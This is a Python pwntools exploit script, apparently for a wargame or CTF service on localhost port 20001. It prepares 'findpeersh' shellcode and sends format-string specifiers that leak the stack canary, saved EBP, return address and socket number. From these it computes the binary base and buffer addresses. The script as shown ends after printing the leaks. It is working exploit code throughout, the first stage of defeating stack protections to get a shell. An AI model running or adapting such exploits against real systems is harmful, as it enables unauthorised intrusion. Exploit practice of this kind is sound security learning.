#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

SHELLCODE = asm(shellcraft.findpeersh())

r = remote('localhost', 20001)
r.readline()

# Canary = %134$
# ebp (0xffd2da98) = %137$
# ret addr (0x56557d4b) = %138$
# socket = %139$

# fmt base (0x56557000) = ret_addr - 0xd4b
# buffer addr (0xffd2d86c) = ebp - 556
# addr of ret (0xffd2da7c) = ebp - 28

r.sendline(flat(
    '%134$08x', # Canary
    '%137$08x', # EBP
    '%138$08x', # ret addr
    '%139$08x'  # socket
))

canary     = int(r.recv(8), 16)
ebp        = int(r.recv(8), 16)
ret        = int(r.recv(8), 16)
socket     = int(r.recv(8), 16)
fmt_base   = ret - 0xd4b
buffer     = ebp - 556
ret_addr   = ebp - 28
r.recvline()

print('canary     0x{:08x}'.format(canary      ))
print('ebp        0x{:08x}'.format(ebp         ))
print('ret        0x{:08x}'.format(ret         ))
print('socket     0x{:08x}'.format(socket      ))
print('fmt_base   0x{:08x}'.format(fmt_base    ))
print('buffer     0x{:08x}'.format(buffer      ))
print('ret_addr   0x{:08x}'.format(ret_addr    ))
